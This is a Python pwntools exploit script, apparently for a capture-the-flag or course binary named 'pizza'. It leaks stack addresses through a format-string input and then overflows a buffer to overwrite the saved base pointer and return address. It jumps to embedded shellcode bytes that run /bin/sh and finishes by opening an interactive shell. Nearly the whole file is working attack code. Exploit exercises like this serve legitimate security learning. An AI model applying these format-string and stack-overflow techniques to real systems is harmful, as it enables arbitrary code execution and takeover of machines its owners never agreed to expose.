#!/usr/bin/env python3

# Contron flow integrity violation 
# Author: Long Tran

# needs pwn tools
from pwn import *

#context.log_level = 'error'

# Executable and Linkable Format
elf = ELF("./pizza")
# specify the context
context(arch='amd64', os='linux', endian='little', word_size=64)

# my shellcode program
shellcode = [0x48, 0x31, 0xc0, 0x50, 0x48, 0x89, 0xe6, 0x48, 0x89, 0xe2, 0x48, 0xbb, 0x3b, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x88, 0xd8, 0x53, 0x48, 0x89, 0xe7, 0x48, 0xff, 0xc7, 0x0f, 0x05]
# do some printing about the shellcode
print("len of shellcode is", len(shellcode), "bytes")


# memory leak
# the input to leak the memory
input1 = b"%p " * (10)

# run the process
victim = process("./pizza")

# get the first output line
print(str(victim.recvline(), "latin-1"))
# send the input1 to leak the memory
victim.sendline(input1)
# retrieve the leaked memory
mem_leak = str(victim.recvline(), "latin-1")
mem_leak = mem_leak.split()

# input and output to pass a few steps 
victim.sendline(b"10")
for i in range(7):
    print(str(victim.recvline(), "latin-1"))

# the place where it crashed was 136
# the old base stack pointer is 128-135 (inclusive). 
# the return address was 136-144 (inclusive)
# set the payload size to be the codes to where the base pointer ends + the return address + plus the shell code
payload_size = 145 + len(shellcode)
# set it to A
payload = "A" * payload_size
# convert it to bytearray
payload = bytearray(payload, encoding="latin-1")

# exploit
# memory leak
loc = 7
address = int(mem_leak[loc], 16)
# add to the offset between that variable and the RSP
bp_addr = address # set the stack poitner to the leaked address
ret_addr = address + 0x20 
#print(hex(address))
ret_addr = ret_addr.to_bytes(8, byteorder="little")
bp_addr= bp_addr.to_bytes(8, byteorder="little")

# set the address
# base stack pointer
payload[128:136] = bp_addr #0x20
# return stack pointer
payload[136:144] = ret_addr  #0x20

# set the payload
payload[144:] = shellcode #b"B"*len(shellcode)#shellcode
print(len(payload), len(shellcode),  len(payload) - len(shellcode))
#print("shell code is", shellcode)
#print("paytload is", payload)
#print("mem leak", mem_leak)
# send the payload and wait
victim.sendline(payload)
for i in range(1):
    print(str(victim.recvline(), "latin-1"))
#
#victim.recvline()
#victim.sendline(b"10")

victim.interactive()
#victim.wait()

#core = victim.corefile
#rsp = core.rsp
#rbp = core.rbp
#rip = core.rip
#data = core.data
#print("rip is", hex(rip))
#print("rbp is", hex(rbp))
#print("rsp is", hex(rsp))
#for i in range(10):
#    my_addr = rsp - 8* i
#    print("memory is", hex(my_addr), hex(core.unpack(my_addr)))
#print("------------------")
#for i in range(10):
#    my_addr = rsp + 8* i
#    print("memory is", hex(my_addr), hex(core.unpack(my_addr)))
